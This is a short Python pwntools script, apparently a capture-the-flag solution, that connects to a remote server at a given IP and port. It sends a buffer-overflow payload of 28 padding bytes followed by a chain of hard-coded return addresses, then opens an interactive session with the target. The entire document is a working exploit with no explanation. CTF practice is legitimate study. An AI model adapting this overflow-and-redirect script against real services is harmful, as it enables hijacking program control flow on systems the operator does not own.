from pwn import *

p = remote('159.65.13.76', 33108)

payload = 'A'*28+p32(0x80485c3)+p32(0x80485dd)+p32(0x8048601)+p32(0x8048631)+p32(0x8048556)

print p.recv()
p.sendline(payload)
print p.recv()
p.interactive()
